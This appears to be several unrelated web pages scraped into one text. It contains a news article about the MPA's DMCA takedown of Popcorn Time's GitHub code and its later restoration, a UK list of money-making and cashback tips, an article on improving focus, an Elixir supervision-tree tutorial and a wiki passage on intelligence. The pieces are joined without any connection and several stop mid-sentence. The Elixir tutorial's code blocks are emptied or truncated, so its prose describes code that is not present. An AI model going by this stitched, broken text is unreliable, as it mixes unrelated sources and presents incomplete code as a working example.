			<p>For more than half a decade, Popcorn Time has been a thorn in the side of Hollywood. </p>
<p>The ‘Netflix for Pirates’ offers an easy-to-use application that opens the door to a library of thousands of streamable movies and TV-shows. </p>
<p>The Motion Picture Asociation (MPA) recognized this threat early on and pressured the original developers to throw in the towel. That worked, but it came too late as the open-source project was swiftly revived by others.</p>
<p>Today, Popcorn Time lives on through many project forks. The most popular is PopcornTime.app, which like its predecessor, <a href="https://github.com/popcorn-official" target="_blank">shares its source code publicly</a> on the developer hosting platform GitHub. This allows others to download, modify, and share it. </p>
<p>The MPA is not happy with this and took action recently. The movie industry group <a href="https://torrentfreak.com/mpa-suggests-github-could-be-held-liable-for-popcorn-times-copyright-infringements-200505/" target="_blank">informed GitHub</a>, which is owned by Microsoft, about the infringing nature of the software. According to the MPA, the application includes links to pirate sites, pirate APIs, and pirate torrent trackers, which are used to download pirated movies and TV-shows.</p>
<center><img src="https://torrentfreak.com/images/mparequest.jpg" alt="" width="500" height="354" srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20354'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" data-lazy-src="https://torrentfreak.com/images/mparequest.jpg"></center>
<p>On top of that, the MPA suggested that GitHub itself may be liable for copyright infringement if the company fails to take action. </p>
<p>While the MPA’s interpretation of the law is likely not shared by GitHub, the company did remove the Popcorn Time code. In most cases that would be the end of the story, but Popcorn Time was not backing off without a fight. </p>
<p>The developers submitted a DMCA counternotice explaining that the MPA’s request is not legitimate. The code is owned by Popcorn Time, not the MPA, and Popcorn Time asked GitHub to restore access. </p>
<p>“The code is 100 % ours and do not contain any copyright [sic] material please check again,” the <a href="https://github.com/github/dmca/blob/d7f4a6a3aade92999d4d86962972c4b27af820e3/2020/05/2020-05-04-MPA-counternotice.md" target="_blank">developer wrote</a>.</p>
<p>The app’s developers made a good point here. The identified code (not the built app) is not directly copyright infringing and it contains no direct links to copyright-infringing material either. This means that a DMCA notice may not be the right tool here.</p>
<p>Faced with both requests, GitHub has now decided to restore full access to the Popcorn Time repository. </p>
<p>This decision doesn’t necessarily mean that it agrees with the app developers, however. The DMCA simply prescribes that, following a counternotice, content can be restored after two weeks, unless the claiming party files a lawsuit. </p>
<center><img src="https://torrentfreak.com/images/popcorngit.jpg" alt="" width="590" height="451" srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" sizes="(max-width: 590px) 100vw, 590px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20590%20451'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" data-lazy-src="https://torrentfreak.com/images/popcorngit.jpg"></center>
<p>In this case, the MPA chose not to file a lawsuit against the Popcorn Time operators, so the code repositories are back online again. </p>
<p>Whether the MPA will follow-up with further action has yet to be seen. However, the whole episode highlights an interesting issue. There is little doubt that the Popcorn Time application is a pirate app. However, the code, as hosted by GitHub, is not infringing per se. As such, regular takedown notices don’t appear to work here.</p>

These are not the type of ideas that will bring in huge sums of money. No. These are little things you can do every day to earn or save some money to survive a recession, unemployment or any other temporary financial setback.</p><p>If you have a stable job and earn about £100k a year, this list probably isn't for you. This list is for people who've been made redundant and need money to help them get by until they find a new job. It's for a mother who just had a baby, isn't working, and has a couple of hours to spare each day. It's for that person who is curious and wants to know how to make £5 today or £50 tomorrow.&nbsp;</p><p>If this all makes sense, here are my top twelve ideas for making money online to survive a recession in 2020. Note that the examples I used here are specific to the UK, but the general ideas are applicable globally.<br></p><h2><strong>1. Online Surveys</strong></h2><blockquote>Get paid to participate in research from universities and companies.</blockquote><ol role="list"><li><a href="https://prolific.co/" target="_blank"><strong>Prolific</strong></a> - The pay is roughly about minimum wage. The more surveys you do, the more you'll earn. There's a Chrome extension that alerts you whenever a new survey is available. You'll need at least a fiver to cash-out, which is roughly three to six surveys.</li><li><a href="https://www.qmee.com/" target="_blank"><strong>Qmee</strong></a> - Earn cash rewards for engaging with brands and for sharing your opinion by answering surveys. There's no minimum payout, and the money goes straight to PayPal.</li><li><a href="https://yougov.co.uk/" target="_blank"><strong>YouGov</strong></a><strong> </strong>- Complete surveys to earn points. You can redeem your points for £50 cash.</li><li><a href="https://surveys.google.com/google-opinion-rewards/" target="_blank"><strong>Google rewards</strong></a> - Complete short surveys and get rewarded with Google Play or PayPal credits. The payout is quite small, so most people use it to pay for things like magazine subscriptions and mobile games.</li><li><a href="https://www.populuslive.com/" target="_blank"><strong>PopulusLive:</strong></a> Earn money for completing surveys. The minimum payout is £50. Payments are made by bank transfer (BACS) or by cheque.</li></ol><h2><strong>2. Cashback</strong></h2><blockquote>‍<strong>‍</strong>Cashback is a service that lets you get money back on goods, services, and travel through exclusive partnerships with brands and leading retailers. For example, if you spent £50 at Tesco and got a 10% cashback, that's free £5 in your pocket. Here's how to get cashback:</blockquote><ol role="list"><li><strong>Banks </strong>- Some of the big banks offer cashback to their customers. Check your mobile app or online banking to see if your bank offers cashback. Here are a few popular ones: <a href="https://www.barclays.co.uk/current-accounts/cashback/" target="_blank">Barclays</a> (up to 10% cashback), <a href="https://www.lloydsbank.com/online-banking/benefits-online-banking/everyday-offers.html" target="_blank">Lloyds</a> (up to 15% cashback) and <a href="https://www.santander.co.uk/personal/support/understanding-our-services/retailer-offers" target="_blank">Santander</a> (up to 15% cashback).</li><li><strong>Cashback Sites </strong>- These are independent companies that give you money back when you buy from one of their registered retailers or brands. The popular ones are <a href="https://www.quidco.com/" target="_blank">Quidco</a>, <a href="https://www.shopmium.com/uk" target="_blank">Shopmium</a>, <a href="https://ohmydosh.co.uk/" target="_blank">OhMyDosh</a>, <a href="https://www.swagbucks.com/" target="_blank">Swagbucks</a>, and <a href="https://www.topcashback.co.uk/" target="_blank">TopCashback</a>.</li></ol><h2><strong>3. Earn Rewards for your Data </strong></h2><blockquote>With these services, you share some of your data like a scanned copy of your supermarket receipt to earn rewards. Here are some companies that offer these services:</blockquote><ol role="list"><li><a href="https://www.airtimerewards.co.uk/" target="_blank"><strong>Airtime Rewards</strong></a> - This is great for people looking to reduce or offset their mobile phone bills. You need to link your card first, then each time you make a purchase at a registered retailer, you'll earn a reward. You can redeem this reward to your mobile bill.&nbsp;</li><li><a href="https://www.shoppixapp.com/" target="_blank"><strong>Shoppix</strong></a><strong> </strong>- Snap receipts and answer surveys to collect tokens. You can redeem tokens for cash via a PayPal account or vouchers of £5, £10 and £20.</li><li><a href="https://www.huyuapp.co.uk/" target="_blank"><strong>Huyu</strong></a> - Here, you scan supermarket receipts and answer surveys for rewards like shopping vouchers. The minimum payout is 500 points.</li></ol><p>‍<br></p><h2><strong>4. Referral Deals</strong></h2><blockquote>Most tech companies will offer you money when you invite your friends to join their website or sign up for their app. Even <a href="http://www.rafflecopter.com/rafl/display/1f4afe751/?" target="_blank">Koody</a> has a referral deal. Here are a few good ones:</blockquote><ol role="list"><li><a href="https://partner.koody.co/LAMB" target="_blank"><strong>Look After My Bills</strong></a><strong> </strong>- You and your friend each get a £20 voucher if your friend switches both gas and electricity through your referral link. You both get a £10 voucher if your friend switches electricity only.</li><li><a href="http://www.rafflecopter.com/rafl/display/1f4afe751/?" target="_blank"><strong>Koody</strong></a> - Invite a friend to join our personal finance community, and you both stand a chance of winning £10.</li><li><a href="https://withplum.com/referral/" target="_blank"><strong>Plum</strong></a> - Earn £15 for each three successful referrals.</li><li><a href="https://bulb.co.uk/referral/" target="_blank"><strong>Bulb</strong></a> - You and your friend each get £50 when your friend switches their electricity and gas over to Bulb, or £25 if they just switch electricity or gas.</li><li><a href="https://www.metrobankonline.co.uk/about-us/press-releases/news/metro-bank-new-refer-a-friend/" target="_blank"><strong>Metro Bank</strong></a> - Refer your friend, and you both receive £50 after a successful switch. The offer runs until 11th December 2020.</li></ol><p>‍<br></p><h2><strong>5. Product Reviewer Jobs</strong></h2><blockquote>‍<strong>‍</strong>You can earn some extra cash by reviewing products online and testing websites. For these types of jobs, expect to get paid between £8 and £20 for a task which might take you 20 to 25 minutes to complete. Most payments are via PayPal. Below are five websites for product reviews and testing:</blockquote><ol role="list"><li><a href="https://www.testingtime.com/en/become-a-paid-testuser/" target="_blank"><strong>TestingTime</strong></a> - You can earn up to €50 per hour.</li><li><a href="https://www.hellopingpong.com/become-a-tester" target="_blank"><strong>Pingpong</strong></a> - Earn between €15 and €100 for each session. Payments are via Paypal or Transferwise.</li><li><a href="https://www.usercrowd.com/" target="_blank"><strong>UsabilityHub/UserCrowd</strong></a><strong> </strong>- Minimum payout is $10.&nbsp;</li><li><a href="https://www.intellizoom.com/" target="_blank"><strong>Intellizoom</strong></a> - Most studies take an average of 10-20 minutes. You can expect to make $2 - $10 per study on average.</li><li><a href="https://userbrain.net/" target="_blank"><strong>Userbrain</strong></a> - Receive new tests each week and get paid $3 per test.</li></ol><p>‍</p><h2><strong>6. Energy Auto-switching</strong><br></h2><blockquote>This one saves you time and money. Auto-switching companies automatically switch your energy tariff to keep you on the best deal. It takes about two minutes to sign up, and it's completely free except you opt-in for a paid plan. Here are the ones we feature on Koody:</blockquote><ol role="list"><li><a href="https://partner.koody.co/switchd" target="_blank"><strong>Switchd</strong></a> - Depending on the size of your home, you could save £400+ a year.</li><li><a href="https://partner.koody.co/LAMB" target="_blank"><strong>Look After My Bills</strong></a> - 99% of new members on credit meters find a saving straight away.</li></ol><p>‍<br></p><h2><strong>7. Smart Savings</strong><br></h2><blockquote>You will hardly make any new money from this idea. Instead, you'll save some of what you already have. Here's how to save smartly:</blockquote><ol start="" role="list"><li><strong>Round Ups</strong> - Some apps like <a href="https://www.moneyboxapp.com/" target="_blank">Moneybox</a> help you save your spare change by rounding up your card transactions to the nearest pound and saving the difference (e.g., if you spend £2.30 on a snack, these apps save 70p for you). Over an extended period, this money adds up and could become quite valuable. Some banks also offer round ups. Check to see if your bank does.&nbsp;</li><li><strong>Auto-saving</strong> - Automating your savings saves you time and reduces the temptation of spending above your budget. There are two ways you can automate your savings:<strong>‍</strong></li></ol><ul role="list"><li>~~Do it yourself<strong> </strong>- Set up a standing order to move money from your current account to your savings account every month. This is easy, and you can do it with your bank's mobile app or online banking.<strong>‍</strong></li><li>~~Use an auto-savings app - Some apps will automate your savings by moving money from your current account to an e-wallet regularly. These apps are useful if you want to reduce the temptation of dipping into your savings. Here are a few popular ones: <a href="https://withplum.com/" target="_blank">Plum</a>, <a href="https://www.getchip.uk/" target="_blank">Chip</a>, <a href="https://www.tandem.co.uk/" target="_blank">Tandem</a> and <a href="https://www.meetcleo.com/" target="_blank">Cleo</a>. You can read more about auto-saving apps <a href="https://www.koody.co/saving/auto-saving" target="_blank">here</a>.</li></ul><p>‍<br></p><h2><strong>8. Bank Switching Deals</strong></h2><blockquote>Many big banks will offer you money to move your current account over to them. I'm not a massive fan of bank switching deals because it can take several months to receive the bonus. But, if you're a patient person, you should check out the ones below:</blockquote><p><strong>1. </strong><a href="https://personal.natwest.com/personal/current-accounts/select_account.html" target="_blank"><strong>Natwest Everyday Bank Account</strong></a> - £125 switching bonus (available to new and existing customers).</p><p><strong>How it works</strong></p><ul role="list"><li>Pay in at least £1,500 by 15th January 2021.&nbsp;</li><li>Log in to your mobile app or online banking by 15th January 2021.</li><li>Receive the £125 bonus by 12th February 2021.</li><li>Offer runs until 19th November 2020.</li></ul><p><strong>2.</strong>‍<a href="https://www.hsbc.co.uk/current-accounts/products/advance/" target="_blank"><strong> HSBC Advance</strong></a><strong> </strong>- £125 bonus when you switch to HSBC + access to 2.75% Regular savings account.</p><p><strong>How it works</strong></p><ul role="list"><li>Open the account as a new customer.</li><li>Use the Current Account Switch Service within 30 days to complete a full switch with at least two direct debits or standing orders.</li><li>The bonus will be paid within 30 days of the switch completing.</li><li>You will need to pay in £1,750 or more each month (you can always close the account once you've received the bonus).</li></ul><p>‍</p><p><strong>3.</strong><a href="https://personal.rbs.co.uk/personal/current_accounts.html" target="_blank"><strong> RBS</strong></a><strong> </strong>- £100 bonus when you switch to RBS</p><p><strong>How it works</strong></p><ul role="list"><li>Pay in at least £1,500 by 30th December 2020.</li><li>Log in to your mobile app or online banking by 30th December 2020.</li><li>Receive your £100 bonus by 29th January 2021.</li><li>Offer runs until 19th November 2020.</li></ul><p>‍</p><p><strong>4. </strong><a href="https://www.lloydsbank.com/current-accounts/switch.html" target="_blank"><strong>Lloyds Bank</strong></a><strong> </strong>- £100 when you switch to Lloyds bank.</p><p><strong>How it works</strong></p><ul role="list"><li>Pay in at least £1,500 by 30th December 2020.</li><li>Log in to your mobile app or online banking by 30th December 2020.</li><li>Receive the £100 bonus ten working days after switching.</li><li>Offer runs until 9th November 2020.</li></ul><p>‍</p><p><strong>5. </strong><a href="https://www.metrobankonline.co.uk/about-us/press-releases/news/metro-bank-new-refer-a-friend/" target="_blank"><strong>Metro Bank</strong></a><strong> </strong>- If you are an existing Metro bank customer, you can refer a friend, and you'll both receive £50 after your friend successfully switches to Metro. The offer runs until 11th December 2020.</p><p>‍<br></p><h2><strong>9. Sell Old Stuff Online</strong></h2><blockquote>Selling your old stuff online is one of the best ways to make money quickly. It is also pretty straightforward and effortless to implement. You can sell anything from used clothes to old gadgets. You also can list your products as 'collection only' so you don't have to bother about delivery and delivery costs. However, if you want to appeal to a broader audience, remember to factor in delivery costs. Here are a few places where you can sell things online:</blockquote><ol role="list"><li>Facebook Marketplace</li><li>Instagram</li><li>eBay</li><li>Etsy</li><li>Amazon</li></ol><p>‍<br></p><h2><strong>10. Hobbies</strong></h2><blockquote>Identify your hobby and find a way to make money from it. Here are a few popular hobbies and my suggestions on how to make money from them:</blockquote><ol role="list"><li><strong>Drawing/Painting </strong>- sell your art online.</li><li><strong>Handyman </strong>- list your services online.</li><li><strong>Gardening</strong> - sell the house plants online.</li><li><strong>Photography</strong> - sell your photos using image hosting services like <a href="https://www.smugmug.com/" target="_blank">SmugMug</a>.</li><li><strong>Writing</strong> - start a blog.</li><li><strong>Cooking</strong> - start a youtube channel or an Instagram or TikTok account.</li></ol><p>‍</p><h2><strong>11. Employee Discounts</strong><br></h2><p>People often forget to take advantage of employee perks. Websites like <a href="https://www.perksatwork.com/" target="_blank">Perks At Work</a> and <a href="https://www.perkbox.com/uk" target="_blank">Perkbox</a> offer discounts on several retailers and brands. Employee perks are company-specific, so if you and your partner don't work in a company that offers them, you won't be able to benefit from them.&nbsp;</p><p>‍</p><p>Combining employee perks with cashback offers can be quite powerful and can significantly reduce your bills. It is also worth adding that even if it's just your partner who has access to these discounts, you can also benefit from them.</p><p>‍</p><h2><strong>12. Improve your Skills</strong></h2><p>If you've been made redundant, there's never been a better time to start improving your skills.</p><p>As you take advantage of some of the money-making ideas I listed above, try to dedicate some time each …</p></div></div></div></div>

       <p>Why can't we focus anymore? Why is it so difficult to focus on reading, studying, or thorough problem solving?</p>
       <p>Before we dive into the actionable part, here are some simple reasons why it's harder than ever to focus.</p>
       
       <h2>Why we can't focus</h2>
       <h4><strong>Reason #1: we process more information than ever.</strong></h4>
       <p>According to researchers from the University of California-San Diego, we consume through our phones, laptops, TVs and all other devices about&nbsp;<a target="_blank" href="https://ijoc.org/index.php/ijoc/article/viewFile/1566/743">34 GB of information per day.</a></p>
       <p>The researchers say this leads to an information overload that hampers our focus and leads to constant interruptions that prevent us from reflection and deeper thinking.</p>
       
       
       <h4><strong>Reason #2: filtering out information takes effort.</strong></h4>
       <p>Contrary to common sense,&nbsp;<strong>ignoring things is not a passive mental process.</strong></p>
       <p>Researchers have found that&nbsp;<strong>it takes energy to ignore irrelevant stimuli.</strong></p>
       <p>In the Distracted Mind, neuroscientist Adam Gazzaley writes:</p>
       <blockquote><p>What we learned from this experiment was that the act of ignoring is not a passive process; rather, the goal to ignore something is an active one that is mediated by the top-down suppression of activity below baseline levels of passively viewing.</p>
       <p><a target="_blank" href="https://www.ncbi.nlm.nih.gov/pubmed/15814009">(Source)</a></p>
       </blockquote>
       <p>It's not just about focusing better, but also about&nbsp;<em>ignoring better.</em></p>
       
       
       <h4><strong>Reason #3: we're being trained like mice by a variable-ratio reward schedule.</strong></h4>
       <p>Every like on social media, every notification, every email represents something&nbsp;<em>new!!!</em></p>
       <p><em>New</em>&nbsp;is exciting for us. Every such message releases the&nbsp;<a target="_blank" href="http://sitn.hms.harvard.edu/flash/2018/dopamine-smartphones-battle-time/">neurotransmitter dopamine</a>&nbsp;in our heads, making us feel good and adventurous.</p>
       <p><em>What if my crush sent me a message?</em><br>
       <em>What if I got that job?</em><br>
       <em>What if a friend wants to meet up and hang?</em></p>
       <p>Unlike in the past, now we carry with us devices that enable us to check if the above is true in about 3 seconds.</p>
       <p>How are we then supposed to do work which may require serious mental effort when we have dopamine-candy within our reach almost 24/7?</p>
       
       <p><strong>We process more information than ever, so filtering out the noise takes a lot of effort, and we're constantly being led astray from focus by dopamine-loaded interruptions. No wonder we can't focus.</strong></p>
       
       <h2>How to improve focus</h2>
       <p>Given that ignoring is an active process, we'll suggest ways to both ignore noise better and focus on the signal better.</p>
       <h3>Strategic focus vs task focus</h3>
       <p>Before we go any further, we'll split focus into 2 types:</p>
       <ul>
       <li><strong>1. Strategic focus</strong><br>
       Answering the question: What to focus on?</li>
       <li><strong>2. Task focus</strong><br>
       Answering the question: How do I focus on work?</li>

       </ul>
       
       <h3>1. How to improve strategic focus</h3>
       <p>Let's start with the obvious.</p>
       
       <h4>Define what you want to focus on</h4>
       <p>It's hard to focus on something if you don't know what it is.</p>
       <p>If you're looking into a heavy fog, there's nothing to focus on. Same goes for mental fog.</p>
       <p>While it's becoming popular to say "systems &gt; goals" or even "no goals" at all, we are goal-driven by nature.</p>
       <p>On a neural level, we filter information through our goals. Our perception of reality is to a large extent driven by goals.</p>
       <p>As neuroscientist Adam Gazzaley writes in the Distracted Mind:</p>
       <blockquote><p>... the inward flow of information is sculpted and pruned by goals in much the same way that our actions are, resulting in our perceptions being an interpretation of reality and not a veridical representation.</p>
       </blockquote>
       <p>In other words, when you're looking for Waldo, your mind activates neural circuits to find someone in a red-striped shirt and ignores almost all else.</p>
       <p>Your goal determines your perception of reality. You're more likely to spot information relevant to your goal than all other information out there.</p>
       <p>If you have a clear goal, it will be that much easier to spot the right information to help you achieve it and ignore the noise.</p>
       <p>Which brings us to this question:<br>
       <strong>What do you want to do?</strong></p>
       <p>Make a list.</p>
       <p>Once you have some sort of a list, it's not yet time to pursue all the items on it.</p>
       <p>It's time to prioritize and refine.</p>
       
       <h4>Define what&nbsp;<em>not</em>&nbsp;to focus on - use Warren Buffett's goal setting method</h4>
       <p>Once you have any kind of a list of things you'd like to accomplish, it's not yet time to pursue goals. That would be unfocused.</p>
       <p>Here's Warren Buffett's advice on goals:</p>
       <ol>
       <li>Write down the top 25 goals that you want to achieve in life.</li>
       <li>Select the 5 that matter the most.</li>
       <li>Forget the rest.</li>

       </ol>
       <p>Buffett highlights that pursuing all 25 will distract you. It will lead to a haphazard, unfocused approach that likely won't lead to results.</p>
       <p>The general principle of picking fewer goals than you think you want can be applied every day. It's a safeguard against the tendency to pick too many goals and diffuse your efforts.</p>
       
       <h4>Find 2 Wildly Important Goals<br>(and put them where you'll see them)</h4>
       <p>In 4 Disciplines of Execution, the authors recommend finding 2 wildly important goals (WIGs).</p>
       <p>WIGs are goals that are so important that if you achieve them, everything else will likely work out.</p>
       <p>They also recommend putting your goals into a specific format:<br>
       <strong>X to Y by when.</strong></p>
       <p>If you were to define the 2 Wildly Important Goals to focus on, what would they be?</p>
       <ul>
       <li>Get to $10 000 in revenue by July 1.</li>
       <li>Write 50 000 words by August 31st.</li>
       <li>...</li>

       </ul>
       <p><strong>Define your goals to have a clear target to focus on.</strong></p>
       <p>However, that's not enough. You can write down the goals and forget them. Completely.</p>
       <p>You need to be hyper-aware of those goals, so that they stay on your mind even through the daily turmoil of life.</p>
       <p>How to do that?</p>
       <p>How to focus on goals that matter despite the noise? </p>
       
       <h4>Create an ambient visual reminder for WIGs</h4>
       <p>Once you have clear goals, you need to make them obvious to you every day.</p>
       <p>To do that, we recommend creating an ambient visual reminder.</p>
       <p>A post-it note written with a thick marker on your desk.<br>
       A big poster above your door.<br>
       A timeline on a whiteboard.</p>
       <p>Something in your&nbsp;<em>physical</em>&nbsp;(not digital) environment.</p>
       <p>The trouble with a digital environment is that if you have a goal written in a to-do app of some sort, once you close it it's out of sight out of mind. If you don't open the app in the morning, you don't get reminded of the goal.</p>
       <p><strong>Create a highly visual reminder for your goals and place it in your surroundings so that you see it every day. Every time you glance at it, it will remind you to focus.</strong></p>
       
       <h4>Strategic focus - summary</h4>
       <ol>
       <li><strong>Define what to focus on.</strong><br>
       Make a written list.</li>
       <li><strong>Select only the top-most items from that list - ideally 2 items.</strong><br>
       Decide to explicitly&nbsp;<em>not</em>&nbsp;focus on other, less important goals at the moment.</li>
       <li><strong>Phrase them in the following way: From X to Y by when.</strong></li>
       <li><strong>Place a visual reminder in your surroundings.</strong><br>
       Put it somewhere in your physical environment where it's impossible to miss.</li>

       </ol>
       <p>If you do this, you will become hyper-aware of when you're moving towards your most important goals, and when you're not. What you need to focus on will stay at the top of your mind, instead of being forgotten.</p>
       
       
       <h3>2. How to improve task focus</h3>
       <p>Once you know what to focus on, it's time to focus on it.</p>
       <p>As we mentioned before, ignoring irrelevant stimuli is not a passive process. It takes effort.</p>
       <p>It makes sense to divide improving concentration into 2 parts:</p>
       <ul>
       <li>Improve ignoring</li>
       <li>Improve concentration</li>

       </ul>
       <p>Let's get into it.</p>
       
       <h4>How to ignore better</h4>
       <p>To minimize the effort required to ignore irrelevant stimuli, either remove them if you can, or use something to make it easier to block out the noise.</p>
       <ul>
       <li><p><strong>Put on noise-canceling headphones.</strong><br>
       This is taking the&nbsp;<em>ignore the noise</em>&nbsp;literally. Background noises can disrupt our attention (especially true for people with ADD/ADHD). Whether it is your neighbors arguing or a&nbsp;<em>PING!</em>&nbsp;of a notification, if you can't hear them, you don't need to take the effort to filter them out.</p>
       </li>
       <li><p><strong>Find a quiet place to work.</strong><br>
       Sometimes even noise-canceling headphones aren't enough, in that case a public library or an empty class/conference room might do wonders. Even a different room can work.</p>
       </li>
       <li><p><strong>Declutter.</strong><br>
       Headphones will help with auditory clutter, but what about visual clutter?<br>
       If you have 50 post-its with ideas and to-do lists in sight, it'll take more effort to not glance at them. Remove them.<br>
       Same goes for 25 open browser tabs. Close them or go into fullscreen mode.</p>
       </li>
       <li><p><strong>Batch distracting activities.</strong><br>
       If you need to respond to emails or work requests as they come, learn to ignore them, if for but a moment.<br>
       Deal with emails once every 30 minutes, or once an hour, instead of checking it randomly whenever you get a tiny bit bored or stressed.<br>
       Minimize the number of switches between tasks.</p>
       </li>
       <li><p><strong>Minimize distractions before a work session.</strong></p>
       <p>The phone is a distraction machine. Sure, we can use it productively, but when it's sitting on our desks during work, it's a constant reminder that we could be doing something&nbsp;<em>fun</em>&nbsp;instead.<br>
       Here are our suggestions on minimizing digital distractions:</p>
       <ul>
       <li>Use the&nbsp;<strong>Rule of 3 Senses: hide your phone out of sight, reach, and hearing.</strong><br>
       Put your phone where you can't see, reach it, or hear it. A drawer or a backpack both work.</li>
       <li><strong>Block distracting sites on your computer.</strong><br>
       You can use&nbsp;<a target="_blank" href="https://www.deprocrastination.co/home">our extension</a>&nbsp;or some other extension that performs the same function - blocking distracting sites in your browser. When you don't have the option of opening a new YouTube tab and going down a rabbit hole, you can focus better.</li>

       </ul>
       </li>

       </ul>
       
       <h4>How to concentrate better</h4>
       <p>Now that we have less to ignore, how to really hone in on work?</p>
       <ul>
       <li><p><strong>Go…</strong></p></li></ul></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Tags: programming, elixir, supervisor, supervision tree</p></div><p data-v-d417aca0="">As developers, we always strive to offer our clients a high-quality service (or at least we should :) ). One of the most important features of high-quality service is its reliability. In other words, the service should rarely, if ever, be unavailable.</p><p data-v-d417aca0="">In the Elixir world, we can achieve this easily using a concept known as a supervision tree. Supervision tree is a structure of processes that allows us to build reliable, fault-tolerant and self-healing systems. This can make our application resistant to unexpected bugs that can creep up in the production. The kind of bugs that are really difficult to reproduce and that require specific state of the application to appear (google the term heisenbug). Supervision tree helps us in dealing with those kinds of bugs by simply restarting the part of the tree that's causing the problems. That way, we get to start off with a clean slate, and most of the times, that's enough to solve our issues.</p><p data-v-d417aca0="">So, how does Elixir make that possible?</p><p data-v-d417aca0="">First, let's take a look at how a supervision tree looks graphically.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-complex.png" alt="complex tree" data-v-d417aca0=""></p><p data-v-d417aca0="">At its core, the supervision tree consists of two types of processes: workers and supervisors (imaginatively marked W and S, respectively).</p><p data-v-d417aca0="">Workers are simply processes which run some kind of logic. They are the meat of your application. Supervisors, on the other hand, are processes which supervise other processes, be it workers or other supervisors. This sounds like some kind of processeption, but at its base, it's not that complicated.</p><p data-v-d417aca0="">There are two main tasks a supervisor has: restarting its children processes in the desired way when they terminate (expectedly or unexpectedly), and terminating itself along with its children processes if it deems necessary, i.e. when there's something off with the state in its part of the application.</p><p data-v-d417aca0="">In simpler terms, workers run the domain code and if some error occurs and the worker crashes, or it finishes its work and “dies”, its supervisor restarts it. If crashing happens too often, the supervisor terminates the said process, along with the rest of its children and then terminates itself.</p><p data-v-d417aca0="">There are three available restart strategies:<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_one</code> - the supervisor restarts just the process that terminated,<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_all</code> - the supervisor restarts all of its children if any of its children processes terminates,<br data-v-d417aca0="">- <code data-v-d417aca0="">:rest_for_one</code> - the supervisor restarts the terminated process and the processes defined after the crashed one (I'll refer to this later, to make it more clear with an example).</p><p data-v-d417aca0="">If the restart strategy isn't enough to fix our application, self-termination kicks in. When we define a supervisor process, we can also define its restart tolerance, i.e. how many restarts of its children it will tolerate in certain amount of time before it decides to terminate itself and its children processes (default tolerance is total of 3 restarts in 5 seconds). That way we propagate process restart one level up, making the parent supervisor process restart our supervisor process, which, in turn, starts all of its children processes once again, and we're starting off with a clean slate.</p><p data-v-d417aca0="">Now, enough theory, let's put all this into practice!</p><h2 id="“simple-supervision-tree”" data-v-d417aca0="">Simple supervision tree</h2><p data-v-d417aca0="">Let's start off by making an extremely simple supervision tree, which will be made of one supervisor process and two of its children, which will be workers.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-simple.png" alt="simple-tree" data-v-d417aca0=""></p><p data-v-d417aca0="">First, we'll define our supervisor process.</p><pre data-v-d417aca0=""><code data-v-d417aca0=""><span data-v-d417aca0=""><span data-v-d417aca0="">defmodule</span> <span data-v-d417aca0="">SimpleSupervisor</span></span> <span data-v-d417aca0="">do</span>

</code></pre><p data-v-d417aca0="">As you can see, it's quite simple. We have <code data-v-d417aca0="">start/0</code> function, which we'll call to start our tree.

</code></pre><p data-v-d417aca0="">There is a bit more going on here. First, let's discuss <code data-v-d417aca0="">child_spec/1</code> function.

That function has to return <code data-v-d417aca0="">{:ok, pid}</code>, where <code data-v-d417aca0="">pid</code> will be used by the supervisor to track the process. In <code data-v-d417aca0="">start_link/0</code>, we just log to the console that we're starting the process and use Elixir's <code data-v-d417aca0="">Task</code> module to start a simple process. <code data-v-d417aca0="">Task.start_link/1</code> returns <code data-v-d417aca0="">{:ok, pid}</code>, which is just what we need.</p><p data-v-d417aca0="">We set the process to sleep for 1 000 000 milliseconds so that we have the time to play around with them, shutting them down and watching them restart. In real world applications, you would probably use <code data-v-d417aca0="">GenServer</code> or something similar here, i.e. some useful logic, but that's not the point of this post.

<h2><span id="What_is_intelligence.3F">What is intelligence?</span></h2>
<p>In humans, <b><a href="https://supermemo.guru/wiki/Intelligence" title="Intelligence">intelligence</a></b> is a measure of the ability to <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">solve problems</a>.
</p>
<h2><span id="What_determines_intelligence.3F">What determines intelligence?</span></h2>
<p>Human intelligence depends on (1) innate qualities, (2) upbringing and (3) knowledge. 
</p><p><b>(1)</b> The <b>Genetic component</b> of intelligence is most apparent in the difference between humans and apes (see: <a href="https://supermemo.guru/wiki/Pleasure_of_communication" title="Pleasure of communication">Pleasure of communication</a>), however, it is far less prominent in a healthy human population. Some personality traits may have a greater impact on the ultimate intelligence than the actual innate brain processing power.
</p><p><b>(2)</b> <b>Upbringing</b> plays a crucial role in human intelligence. It should primarily be understood as the period when future intelligence can be undermined by disease, abuse, neglect and/or by limits on freedom. For healthy children, love and <a href="https://supermemo.guru/wiki/Optimization_of_behavioral_spaces_in_development" title="Optimization of behavioral spaces in development">free access to rich environments</a> is usually a sufficient condition for developing high intelligence.
</p><p><b>(3)</b> <b>Knowledge</b>: Given a basic genetic endowment and a healthy modern upbringing, most differences in adult human intelligence can be explained by learning and learning habits. There is also an important component of the interaction between the brain, the personality, and the environment. Some high-potential individuals get trapped in a set of <a href="https://supermemo.guru/wiki/Behavioral_system" title="Behavioral system">behavioral systems</a> that result in stagnation that may be hard to escape.
